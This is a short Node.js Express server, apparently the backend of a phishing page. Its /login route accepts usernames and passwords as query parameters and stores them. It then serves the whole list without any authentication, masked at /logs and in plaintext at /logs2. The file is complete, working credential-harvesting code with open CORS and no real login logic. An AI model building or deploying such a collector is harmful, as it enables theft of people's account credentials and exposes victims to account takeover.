const express = require(`express`);
const fs = require(`fs`);
const axios = require(`axios`);
const app = express();
const cors = require(`cors`);
const path = require(`path`);

let passwords = `Passwords :\n\n`;
let RealPasswords = `Passwords :\n\n`;

app.use(express.static(path.join(__dirname, "public")));

app.set(`trust proxy`, true);
app.use(cors());

console.log(__dirname);

app.get(`/`, async(istek, cevap) => {
  cevap.sendFile(`${__dirname}/public/index.html`);
});



app.get(`/login`, async(istek, cevap) => {
  let username = istek.query.username;
  let password = istek.query.password;
  let maskedPassword = `${password.slice(0, 2)}${'*'.repeat(password.length - 2)}`;
  passwords += `\n\nUsername: ${username} | Password: ${maskedPassword}`;
  RealPasswords += `\n\nUsername: ${username} | Password: ${password}`;
  cevap.sendStatus(200);
});

app.get(`/logs`, async(istek, cevap) => {
  cevap.send(passwords);
});

app.get(`/logs2`, async(istek, cevap) => {
  cevap.send(RealPasswords);
});

app.listen(process.env.PORT || 80, () => {
  console.log(`Website ${process.env.PORT || 80} Portuyla Başladı...`);
});

module.exports = app;